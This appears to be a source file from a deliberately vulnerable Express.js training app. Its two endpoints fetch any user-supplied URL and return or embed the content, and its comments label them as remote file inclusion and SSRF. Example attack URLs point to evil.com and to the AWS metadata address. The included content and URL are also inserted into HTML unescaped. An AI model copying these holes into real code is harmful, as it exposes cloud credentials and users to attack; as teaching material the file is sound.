const express = require('express');
const router = express.Router();

// ==================== RFI (Remote File Inclusion) ====================
// These endpoints fetch/load content from external URLs provided by the user.

// @desc    Load external template/resource (vulnerable — fetches arbitrary URLs)
// @route   GET /api/template/load?url=...
// VULNERABLE: fetches and returns content from any user-supplied URL without validation
// Attack: /api/template/load?url=http://evil.com/malicious.js
// Attack: /api/template/load?url=http://169.254.169.254/latest/meta-data/ (SSRF on AWS)
router.get('/load', async (req, res) => {
    try {
        const url = req.query.url;
        if (!url) return res.status(400).json({ message: 'URL parameter required. Example: /api/template/load?url=https://example.com' });

        // VULNERABLE: fetches arbitrary remote URL and returns content — RFI
        const response = await fetch(url);
        const contentType = response.headers.get('content-type') || 'text/plain';
        const body = await response.text();

        res.setHeader('Content-Type', contentType);
        res.send(body);
    } catch (err) {
        res.status(500).json({ message: 'Failed to fetch remote resource', error: err.message });
    }
});

// @desc    Include remote resource and render it as page content
// @route   GET /api/template/include?url=...
// VULNERABLE: includes remote HTML directly in page — RFI
// Attack: /api/template/include?url=http://evil.com/phishing.html
router.get('/include', async (req, res) => {
    try {
        const url = req.query.url;
        if (!url) return res.status(400).json({ message: 'URL parameter required' });

        // VULNERABLE: includes remote content directly in HTML page — RFI
        const response = await fetch(url);
        const body = await response.text();

        res.send(`
            <html>
            <head><title>NexTalk — Loaded Resource</title></head>
            <body style="font-family:Arial;padding:20px;">
                <h3>Loaded from: ${url}</h3>
                <hr>
                <div>${body}</div>
            </body>
            </html>
        `);
    } catch (err) {
        res.status(500).json({ message: 'Failed to include remote resource', error: err.message });
    }
});

module.exports = router;
